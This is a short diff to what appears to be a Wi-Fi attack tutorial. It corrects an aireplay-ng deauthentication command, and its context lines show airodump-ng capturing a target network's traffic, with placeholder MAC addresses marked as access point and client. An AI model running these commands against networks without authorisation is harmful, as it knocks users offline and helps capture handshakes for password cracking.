@@ -21,7 +21,7 @@ Generally, it is create the interface mon0.
 
 #airodump-ng --channel ch --bssid zz:zz:zz:zz:zz:zz -w FileOfCaptura wlan0
 
-#aireplay-ng 0 F -a aa:aa:aa:aa:aa:aa -c ww:ww:ww:ww:ww:ww wlan0
+#aireplay-ng -0 F -a aa:aa:aa:aa:aa:aa -c ww:ww:ww:ww:ww:ww wlan0
 
 OBS: aa:aa:aa:aa:aa:aa it is the acess point.
      ww:ww:ww:ww:ww:ww it is the client.
